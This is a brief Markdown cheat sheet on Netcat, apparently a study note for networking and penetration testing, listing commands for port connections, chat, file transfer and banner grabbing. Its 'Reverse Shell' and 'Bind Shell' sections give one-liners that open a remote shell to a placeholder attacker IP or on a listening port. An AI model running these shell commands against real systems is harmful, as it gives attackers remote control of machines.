# Netcat

## What is Netcat

- Netcat is a networking tool  
- used for reading and writing data over network  
- also called "Swiss army knife" of networking  

---

## Connect to Port

```
nc <target> <port>
```

---

## Listen on Port

```
nc -lvp <port>
```

---

## Chat Between Systems

listener:

```
nc -lvp 1234
```

sender:

```
nc <target> 1234
```

---

## File Transfer

sender:

```
nc -lvp 1234 < file.txt
```

receiver:

```
nc <target> 1234 > file.txt
```

---

## Reverse Shell

```
nc -e /bin/bash <attacker-ip> <port>
```

---

## Bind Shell

```
nc -lvp <port> -e /bin/bash
```

---

## Banner Grabbing

```
nc <target> 80
```

---

## Use Case

- debugging network  
- file transfer  
- reverse shell  
- basic exploitation  